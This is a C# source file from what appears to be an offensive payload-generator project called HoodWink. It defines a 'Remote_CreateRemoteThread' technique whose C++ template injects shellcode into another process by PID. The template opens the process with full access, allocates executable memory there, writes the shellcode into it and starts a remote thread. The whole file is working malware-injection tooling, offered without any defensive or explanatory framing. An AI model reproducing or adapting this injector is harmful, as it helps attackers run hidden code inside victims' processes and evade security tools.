using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace HoodWink.Languages.Cpp.Techniques
{
    public class Remote_CreateRemoteThread : Models.Base.Technique
    {
        public override string Description => "Inject via CreateRemoteThread";
        public override List<string> FileDependencies => new List<string> { @"" };

        public override string Using => @"#include <Windows.h>
#include <iostream>";

        public override string ApiImports => @"";

        public override string MainLogic => @"// Technique
	HANDLE processHandle;
	HANDLE remoteThread;
	PVOID remoteBuffer;

	printf(""Injecting to PID: %i"", atoi(argv[1]));
	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1]))); // No args checking
	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	CloseHandle(processHandle);";

        public override string AdditionalFunctions => @"";
    }
}
